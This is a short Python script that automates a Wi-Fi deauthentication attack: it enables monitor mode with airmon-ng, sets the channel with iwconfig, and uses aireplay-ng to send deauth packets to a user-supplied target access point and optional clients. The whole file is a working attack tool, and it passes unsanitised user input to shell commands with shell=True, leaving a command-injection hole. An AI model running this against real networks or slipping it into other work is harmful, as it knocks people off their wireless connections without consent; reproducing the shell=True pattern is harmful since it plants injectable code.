import subprocess
import time
import warnings
warnings.filterwarnings("ignore", category=DeprecationWarning)


def execute_command(command):
    """Run a system command and display the output."""
    try:
        output = subprocess.check_output(command, shell=True, text=True)
        print(output)
    except subprocess.CalledProcessError as e:
        print(f"[!] Error executing command: {command}\n{e}")

def start_monitor_mode(interface):
    """Enable monitor mode on the specified wireless interface."""
    print(f"[*] Enabling monitor mode on {interface}...")
    execute_command(f"airmon-ng start {interface}")

def deauth_attack(interface, bssid, channel, clients=None):
    """Perform deauth attack on the target BSSID."""
    print(f"[*] Targeting BSSID: {bssid} on channel {channel}")

    # Set the interface to the correct channel
    print(f"[*] Setting interface {interface} to channel {channel}")
    execute_command(f"iwconfig {interface} channel {channel}")

    time.sleep(2)
    print("[*] Sending deauth packets...")
    if clients:
        for client in clients:
            execute_command(f"aireplay-ng --deauth 10 -a {bssid} -c {client} {interface}")
    else:
        execute_command(f"aireplay-ng --deauth 10 -a {bssid} {interface}")

def main():
    """Main function to handle the script logic."""
    # Get user input
    interface = input("Enter your wireless interface: ").strip()
    bssid = input("Enter the BSSID of the target AP: ").strip()
    channel = input("Enter the channel of the target AP: ").strip()

    # Start monitor mode
    start_monitor_mode(interface)

    # Prepare the monitor interface name
    monitor_interface = f"{interface}mon"

    # Perform the deauth attack
    deauth_attack(monitor_interface, bssid, channel)

if __name__ == "__main__":
    main()
